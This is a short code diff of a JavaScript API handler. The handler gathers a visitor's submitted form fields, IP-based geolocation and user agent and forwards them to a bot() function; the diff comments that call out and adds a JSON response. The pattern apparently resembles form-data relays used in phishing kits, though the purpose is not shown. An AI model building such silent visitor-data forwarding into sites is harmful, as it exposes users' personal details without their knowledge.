@@ -47,13 +47,20 @@ export default async function handler(req, res) {
     const { data } = await geoloc.get("" , {
           ip : req.client.ip
         })
+
+      if(req.body.firstName){
         const geo = data
         geo.ua = req.client.ua
         const packed = `
         ${info(req.body)}
         ${botString(geo)}
         `
-        bot(packed)
-    res.status(200)
+        // bot(packed)
+      }
+        
+    res.status(200).json({
+      msg : 'done',
+      status : 200,
+    })
   }
   
